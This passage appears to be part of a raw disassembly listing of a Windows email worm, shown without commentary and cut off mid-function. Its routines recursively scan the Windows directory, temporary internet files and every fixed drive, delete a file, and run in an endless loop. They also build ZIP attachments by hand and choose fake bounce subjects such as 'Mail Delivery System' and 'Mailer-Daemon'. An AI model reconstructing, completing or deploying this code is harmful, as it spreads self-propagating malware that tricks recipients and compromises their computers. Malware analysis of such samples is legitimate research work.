loc_804EAE:				; CODE XREF: sub_804D32+15Fj
					; sub_804D32+171j
		lea	eax, [ebp+String1]
		push	esi		; lpString2
		push	eax		; lpString1
		call	ebx ; lstrcpyA
		lea	eax, [ebp+String1]
		push	eax		; lpString
		call	ds:lstrlenA
		cmp	byte ptr [eax+edi], 5Ch
		jz	short loc_804EDD
		lea	eax, [ebp+String1]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	ds:lstrcatA

loc_804EDD:				; CODE XREF: sub_804D32+197j
		lea	eax, [ebp-230h]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcatA
		test	[ebp+String2], 10h
		jz	short loc_804F1A
		push	4Bh		; dwMilliseconds
		call	ds:Sleep
		mov	eax, [ebp+arg_4]
		dec	eax
		push	eax
		lea	eax, [ebp+String1]
		push	eax
		call	sub_804D32
		pop	ecx
		pop	ecx
		jmp	loc_804E47
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804F1A:				; CODE XREF: sub_804D32+1C6j
		lea	eax, [ebp+String1]
		lea	esi, [ebp+String2]
		push	eax
		call	sub_804BB6
		mov	esi, [ebp+arg_0]
		pop	ecx
		jmp	loc_804E47
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804F35:				; CODE XREF: sub_804D32+152j
		push	[ebp+hFindFile]	; hFindFile
		call	ds:FindClose

loc_804F3E:				; CODE XREF: sub_804D32+13Fj
		xor	eax, eax
		pop	ebx
		jmp	loc_804D53
sub_804D32	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804F46	proc near		; CODE XREF: sub_805158+4Bp

String1		= byte ptr -1B4h
var_30		= byte ptr -30h
var_2E		= byte ptr -2Eh
var_2D		= byte ptr -2Dh
var_2C		= byte ptr -2Ch
var_2B		= byte ptr -2Bh
var_2A		= byte ptr -2Ah
var_29		= byte ptr -29h
var_28		= byte ptr -28h
var_27		= byte ptr -27h
var_26		= byte ptr -26h
var_25		= byte ptr -25h
var_24		= byte ptr -24h
var_23		= byte ptr -23h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= byte ptr -20h
var_1F		= byte ptr -1Fh
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_1C		= byte ptr -1Ch
var_1B		= byte ptr -1Bh
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= byte ptr -18h
String2		= byte ptr -14h
var_12		= byte ptr -12h
var_11		= byte ptr -11h
var_10		= byte ptr -10h
var_F		= byte ptr -0Fh
var_E		= byte ptr -0Eh
var_D		= byte ptr -0Dh
var_C		= byte ptr -0Ch
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= byte ptr -8
var_7		= byte ptr -7
var_6		= byte ptr -6
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 1B4h
		push	ebx
		push	esi
		xor	ebx, ebx
		push	edi
		mov	edi, ds:lstrcatA
		mov	[ebp+String2], 4Ch
		mov	byte ptr [ebp-13h], 6Fh
		mov	[ebp+var_12], 63h
		mov	[ebp+var_11], 61h
		mov	[ebp+var_10], 6Ch
		mov	[ebp+var_F], 20h
		mov	[ebp+var_E], 53h
		mov	[ebp+var_D], 65h
		mov	[ebp+var_C], 74h
		mov	[ebp+var_B], 74h
		mov	[ebp+var_A], 69h
		mov	[ebp+var_9], 6Eh
		mov	[ebp+var_8], 67h
		mov	[ebp+var_7], 73h
		mov	[ebp+var_6], bl
		mov	[ebp+var_30], 54h
		mov	byte ptr [ebp-2Fh], 65h
		mov	[ebp+var_2E], 6Dh
		mov	[ebp+var_2D], 70h
		mov	[ebp+var_2C], 6Fh
		mov	[ebp+var_2B], 72h
		mov	[ebp+var_2A], 61h
		mov	[ebp+var_29], 72h
		mov	[ebp+var_28], 79h
		mov	[ebp+var_27], 20h
		mov	[ebp+var_26], 49h
		mov	[ebp+var_25], 6Eh
		mov	[ebp+var_24], 74h
		mov	[ebp+var_23], 65h
		mov	[ebp+var_22], 72h
		mov	[ebp+var_21], 6Eh
		mov	[ebp+var_20], 65h
		mov	[ebp+var_1F], 74h
		mov	[ebp+var_1E], 20h
		mov	[ebp+var_1D], 46h
		mov	[ebp+var_1C], 69h
		mov	[ebp+var_1B], 6Ch
		mov	[ebp+var_1A], 65h
		mov	[ebp+var_19], 73h
		mov	[ebp+var_18], bl
		mov	[ebp+var_4], ebx
		mov	esi, 184h

loc_805000:				; CODE XREF: sub_804F46+160j
		push	esi
		lea	eax, [ebp+String1]
		push	ebx
		push	eax
		call	memset
		add	esp, 0Ch
		cmp	[ebp+var_4], ebx
		lea	eax, [ebp+String1]
		push	esi		; uSize
		push	eax		; lpBuffer
		jnz	short loc_805026
		call	ds:GetWindowsDirectoryA
		jmp	short loc_805031 ; lpBuffer
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805026:				; CODE XREF: sub_804F46+D6j
		push	offset Name	; lpName
		call	ds:GetEnvironmentVariableA

loc_805031:				; CODE XREF: sub_804F46+DEj
		cmp	[ebp+String1], bl
		jz	short loc_80509F
		lea	eax, [ebp+String1]
		push	eax		; lpString
		call	ds:lstrlenA
		lea	ecx, [ebp+String1]
		dec	ecx
		cmp	byte ptr [eax+ecx], 5Ch
		jz	short loc_805061
		lea	eax, [ebp+String1]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA

loc_805061:				; CODE XREF: sub_804F46+10Bj
		cmp	[ebp+var_4], 1
		jnz	short loc_805082
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	edi ; lstrcatA
		lea	eax, [ebp+String1]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA

loc_805082:				; CODE XREF: sub_804F46+11Fj
		lea	eax, [ebp+var_30]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	edi ; lstrcatA
		lea	eax, [ebp+String1]
		push	5
		push	eax
		call	sub_804D32
		pop	ecx
		pop	ecx

loc_80509F:				; CODE XREF: sub_804F46+F1j
		inc	[ebp+var_4]
		cmp	[ebp+var_4], 2
		jl	loc_805000
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_804F46	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8050B1	proc near		; CODE XREF: sub_805158:loc_8051A8p

RootPathName	= byte ptr -104h

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		push	ebx
		push	esi
		mov	esi, 104h
		lea	eax, [ebp+RootPathName]
		push	esi
		push	0
		push	eax
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+RootPathName]
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		mov	bl, [ebp+RootPathName]
		lea	eax, [ebp-103h]
		push	offset asc_801A90 ; lpString2
		push	eax		; lpString1
		call	ds:lstrcpyA
		lea	eax, [ebp+RootPathName]
		push	0Fh
		push	eax
		call	sub_804D32
		pop	ecx
		mov	[ebp+RootPathName], 43h
		pop	ecx

loc_805110:				; CODE XREF: sub_8050B1+A1j
		cmp	[ebp+RootPathName], bl
		jz	short loc_805145
		lea	eax, [ebp+RootPathName]
		push	eax		; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 3
		jnz	short loc_805145
		push	1194h		; dwMilliseconds
		call	ds:Sleep
		lea	eax, [ebp+RootPathName]
		push	0Fh
		push	eax
		call	sub_804D32
		pop	ecx
		pop	ecx

loc_805145:				; CODE XREF: sub_8050B1+65j
					; sub_8050B1+77j
		inc	[ebp+RootPathName]
		cmp	[ebp+RootPathName], 5Ah
		jle	short loc_805110
		pop	esi
		pop	ebx
		leave
		retn
sub_8050B1	endp


;  S U B	R O U T	I N E 


sub_805158	proc near		; CODE XREF: sub_802CB2:loc_802D56p
		push	esi
		push	ds:lpFileName	; lpFileName
		call	ds:GetFileAttributesA
		mov	esi, ds:Sleep
		cmp	eax, 0FFFFFFFFh
		jz	short loc_80518F
		push	ds:lpFileName
		call	sub_8048A0
		pop	ecx
		push	ds:lpFileName	; lpFileName
		call	ds:DeleteFileA
		push	1D4C0h		; dwMilliseconds
		call	esi ; Sleep

loc_80518F:				; CODE XREF: sub_805158+16j
		push	0FFFFFFFFh	; nPriority
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:SetThreadPriority
		call	sub_804A7D
		call	sub_804F46

loc_8051A8:				; CODE XREF: sub_805158+62j
		call	sub_8050B1
		inc	ds:dword_808138
		push	6F54h		; dwMilliseconds
		call	esi ; Sleep
		jmp	short loc_8051A8
sub_805158	endp


;  S U B	R O U T	I N E 


sub_8051BC	proc near		; CODE XREF: sub_805205+9p
		mov	eax, ds:dword_80813C
		test	eax, eax
		jnz	short locret_805204
		push	400h		; size_t
		call	ds:malloc
		test	eax, eax
		pop	ecx
		jnz	short loc_8051D6
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8051D6:				; CODE XREF: sub_8051BC+17j
		xor	ecx, ecx
		push	esi

loc_8051D9:				; CODE XREF: sub_8051BC+40j
		push	8
		mov	edx, ecx
		pop	esi

loc_8051DE:				; CODE XREF: sub_8051BC+34j
		test	dl, 1
		jz	short loc_8051ED
		shr	edx, 1
		xor	edx, 0EDB88320h
		jmp	short loc_8051EF
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8051ED:				; CODE XREF: sub_8051BC+25j
		shr	edx, 1

loc_8051EF:				; CODE XREF: sub_8051BC+2Fj
		dec	esi
		jnz	short loc_8051DE
		mov	[eax+ecx*4], edx
		inc	ecx
		cmp	ecx, 100h
		jl	short loc_8051D9
		mov	ds:dword_80813C, eax
		pop	esi

locret_805204:				; CODE XREF: sub_8051BC+7j
		retn
sub_8051BC	endp


;  S U B	R O U T	I N E 


sub_805205	proc near		; CODE XREF: sub_8052A2+3Cp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	esi
		mov	esi, [esp+arg_4]
		test	esi, esi
		jz	short loc_805219
		call	sub_8051BC
		mov	ecx, eax
		test	ecx, ecx
		jnz	short loc_80521D

loc_805219:				; CODE XREF: sub_805205+7j
		xor	eax, eax
		pop	esi
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80521D:				; CODE XREF: sub_805205+12j
		mov	eax, [esp+arg_0]
		push	edi
		mov	edi, [esp+4+arg_8]
		test	edi, edi
		not	eax
		jle	short loc_805242

loc_80522C:				; CODE XREF: sub_805205+3Bj
		mov	dl, [esi]
		xor	edx, eax
		and	edx, 0FFh
		shr	eax, 8
		mov	edx, [ecx+edx*4]
		xor	eax, edx
		inc	esi
		dec	edi
		jnz	short loc_80522C

loc_805242:				; CODE XREF: sub_805205+25j
		pop	edi
		pop	esi
		not	eax
		retn
sub_805205	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805247	proc near		; CODE XREF: sub_805316+B4p

SystemTime	= _SYSTEMTIME ptr -10h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetSystemTime
		mov	eax, dword ptr [ebp+SystemTime.wHour]
		mov	cx, [ebp+SystemTime.wSecond]
		shl	eax, 6
		or	eax, dword ptr [ebp+SystemTime.wMinute]
		shr	cx, 1
		shl	eax, 5
		or	eax, ecx
		mov	ecx, [ebp+arg_0]
		cmp	[ebp+SystemTime.wYear],	7C6h
		mov	[ecx], ax
		jb	short loc_805282
		cmp	[ebp+SystemTime.wYear],	7DCh
		jbe	short loc_805288

loc_805282:				; CODE XREF: sub_805247+31j
		mov	[ebp+SystemTime.wYear],	7D4h

loc_805288:				; CODE XREF: sub_805247+39j
		mov	eax, dword ptr [ebp+SystemTime.wYear]
		mov	ecx, [ebp+arg_4]
		add	eax, 0FFFFFFC4h
		shl	eax, 4
		or	eax, dword ptr [ebp+SystemTime.wMonth]
		shl	eax, 5
		or	eax, [ebp-0Ah]
		mov	[ecx], ax
		leave
		retn
sub_805247	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8052A2	proc near		; CODE XREF: sub_805316+CCp

var_408		= dword	ptr -408h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
hFile		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 408h
		push	ebx
		push	esi
		xor	esi, esi
		push	edi
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	ds:SetFilePointer
		mov	edi, ds:ReadFile
		mov	[ebp+var_8], esi
		mov	ebx, 400h
		jmp	short loc_8052E9
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8052CC:				; CODE XREF: sub_8052A2+5Ej
		cmp	[ebp+var_4], esi
		jz	short loc_805302
		push	[ebp+var_4]
		lea	eax, [ebp+var_408]
		push	eax
		push	[ebp+var_8]
		call	sub_805205
		add	esp, 0Ch
		mov	[ebp+var_8], eax

loc_8052E9:				; CODE XREF: sub_8052A2+28j
		lea	eax, [ebp+var_4]
		push	esi
		push	eax
		lea	eax, [ebp+var_408]
		push	ebx
		push	eax
		push	[ebp+hFile]
		mov	[ebp+var_4], esi
		call	edi
		test	eax, eax
		jnz	short loc_8052CC

loc_805302:				; CODE XREF: sub_8052A2+2Dj
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	ds:SetFilePointer
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_8052A2	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805316	proc near		; CODE XREF: sub_805AA7+244p

var_47C		= dword	ptr -47Ch
NumberOfBytesWritten= dword ptr	-7Ch
var_78		= dword	ptr -78h
var_74		= word ptr -74h
var_72		= word ptr -72h
var_70		= word ptr -70h
var_6E		= word ptr -6Eh
var_6C		= word ptr -6Ch
var_6A		= word ptr -6Ah
var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= word ptr -5Ch
var_5A		= word ptr -5Ah
var_54		= word ptr -54h
var_52		= dword	ptr -52h
var_4E		= dword	ptr -4Eh
Buffer		= dword	ptr -48h
var_44		= word ptr -44h
var_42		= word ptr -42h
var_40		= word ptr -40h
var_3E		= dword	ptr -3Eh
var_36		= dword	ptr -36h
var_32		= dword	ptr -32h
var_2E		= word ptr -2Eh
var_2C		= word ptr -2Ch
var_28		= dword	ptr -28h
var_24		= word ptr -24h
var_22		= word ptr -22h
var_20		= word ptr -20h
var_1E		= word ptr -1Eh
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
hObject		= dword	ptr -0Ch
hFile		= dword	ptr -8
NumberOfBytesRead= dword ptr -4
lpFileName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpString	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 47Ch
		push	ebx
		push	esi
		push	edi
		xor	esi, esi
		mov	edi, 80h
		push	esi		; hTemplateFile
		mov	ebx, ds:CreateFileA
		push	edi		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ebx ; CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFile], eax
		jz	loc_805549
		cmp	eax, esi
		jz	loc_805549
		push	esi		; hTemplateFile
		push	edi		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+arg_4]	; lpFileName
		call	ebx ; CreateFileA
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		mov	[ebp+hObject], edi
		jz	loc_805544
		cmp	edi, esi
		jz	loc_805544
		push	1Eh
		lea	eax, [ebp+Buffer]
		push	esi
		push	eax
		call	memset
		push	2Eh
		lea	eax, [ebp+var_78]
		push	esi
		push	eax
		call	memset
		push	16h
		lea	eax, [ebp+var_28]
		push	esi
		push	eax
		call	memset
		lea	eax, [ebp+var_3E+2]
		mov	[ebp+Buffer], 4034B50h
		push	eax
		lea	eax, [ebp+var_3E]
		push	eax
		mov	[ebp+var_44], 0Ah
		mov	[ebp+var_72], 0Ah
		mov	[ebp+var_42], si
		mov	[ebp+var_70], si
		mov	[ebp+var_40], si
		mov	[ebp+var_6E], si
		call	sub_805247
		mov	ax, word ptr [ebp+var_3E]
		push	[ebp+hFile]
		mov	[ebp+var_6C], ax
		mov	ax, word ptr [ebp+var_3E+2]
		mov	[ebp+var_6A], ax
		call	sub_8052A2
		mov	ebx, ds:GetFileSize
		add	esp, 30h
		mov	[ebp-3Ah], eax
		mov	[ebp+var_68], eax
		push	esi		; lpFileSizeHigh
		push	[ebp+hFile]	; hFile
		call	ebx ; GetFileSize
		push	esi		; lpFileSizeHigh
		mov	[ebp+var_36], eax
		push	[ebp+hFile]	; hFile
		mov	[ebp+var_64], eax
		call	ebx ; GetFileSize
		push	[ebp+lpString]	; lpString
		mov	ebx, ds:lstrlenA
		mov	[ebp+var_32], eax
		mov	[ebp+var_60], eax
		call	ebx ; lstrlenA
		mov	[ebp+var_2E], ax
		mov	[ebp+var_5C], ax
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+Buffer]
		push	1Eh		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	edi		; hFile
		mov	edi, ds:WriteFile
		mov	[ebp+var_2C], si
		mov	[ebp+var_5A], si
		mov	[ebp+var_4E], esi
		call	edi ; WriteFile
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	eax		; nNumberOfBytesToWrite
		push	[ebp+lpString]	; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		add	eax, 1Eh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		mov	[ebp+var_10], eax
		call	ds:SetFilePointer
		jmp	short loc_80548B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80546C:				; CODE XREF: sub_805316+194j
		cmp	[ebp+NumberOfBytesRead], esi
		jz	short loc_8054AC
		lea	eax, [ebp+NumberOfBytesWritten]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_47C]
		push	[ebp+NumberOfBytesRead]	; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		mov	eax, [ebp+NumberOfBytesRead]
		add	[ebp+var_10], eax

loc_80548B:				; CODE XREF: sub_805316+154j
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+var_47C]
		push	400h		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		mov	[ebp+NumberOfBytesRead], esi
		call	ds:ReadFile
		test	eax, eax
		jnz	short loc_80546C

loc_8054AC:				; CODE XREF: sub_805316+159j
		mov	eax, [ebp+var_10]
		push	esi		; lpOverlapped
		mov	[ebp+var_18], eax
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_78]
		push	2Eh		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		mov	[ebp+var_78], 2014B50h
		mov	[ebp+var_74], 14h
		mov	[ebp+var_54], si
		mov	[ebp+var_52], 20h
		call	edi ; WriteFile
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	eax		; nNumberOfBytesToWrite
		push	[ebp+lpString]	; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		mov	ecx, [ebp+var_10]
		push	esi		; lpOverlapped
		mov	[ebp+var_28], 6054B50h
		mov	[ebp+var_24], si
		lea	eax, [ecx+eax+2Eh]
		mov	[ebp+var_22], si
		sub	eax, [ebp+var_18]
		mov	[ebp+var_20], 1
		mov	[ebp+var_1E], 1
		mov	[ebp+var_14], si
		mov	[ebp+var_1C], eax
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_28]
		push	16h		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle

loc_805537:				; CODE XREF: sub_805316+231j
		push	[ebp+hFile]	; hObject
		call	ds:CloseHandle
		mov	eax, esi
		jmp	short loc_80554C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805544:				; CODE XREF: sub_805316+57j
					; sub_805316+5Fj
		push	2
		pop	esi
		jmp	short loc_805537
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805549:				; CODE XREF: sub_805316+30j
					; sub_805316+38j
		xor	eax, eax
		inc	eax

loc_80554C:				; CODE XREF: sub_805316+22Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_805316	endp


;  S U B	R O U T	I N E 


sub_805551	proc near		; CODE XREF: sub_805575+188p
					; sub_8062CA+87p

lpString1	= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		jmp	short loc_80555D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805557:				; CODE XREF: sub_805551+10j
		cmp	cl, 40h
		jz	short loc_805568
		inc	eax

loc_80555D:				; CODE XREF: sub_805551+4j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_805557
		cmp	cl, 40h
		jnz	short loc_805569

loc_805568:				; CODE XREF: sub_805551+9j
		inc	eax

loc_805569:				; CODE XREF: sub_805551+15j
		push	eax		; lpString2
		push	[esp+4+lpString1] ; lpString1
		call	ds:lstrcpyA
		retn
sub_805551	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805575	proc near		; CODE XREF: sub_8062CA+94p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, eax
		push	esi
		push	edi
		lea	edi, [ebx+208h]
		and	byte ptr [edi],	0
		cmp	dword ptr [ebx], 0
		jz	loc_805655
		call	sub_802E9C
		movzx	eax, ax
		push	8
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 7		; switch 8 cases
		ja	short loc_8055E2 ; default
		jmp	ds:off_805709[edx*4] ; switch jump

loc_8055AA:				; DATA XREF: .text:off_805709o
		push	offset aMailDeliverySu ; case 0x0
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055B1:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aMailerDaemon ; case 0x1
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055B8:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aReturnedMail ; case 0x2
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055BF:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aBouncedMail ; case 0x3
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055C6:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aThePostOffice ;	case 0x4
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055CD:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aPostOffice ; case 0x5
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055D4:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aAutomaticEmail ; case 0x6
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055DB:				; CODE XREF: sub_805575+2Ej
					; DATA XREF: .text:off_805709o
		push	offset aMailAdministra ; case 0x7
		jmp	short loc_8055E7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8055E2:				; CODE XREF: sub_805575+2Cj
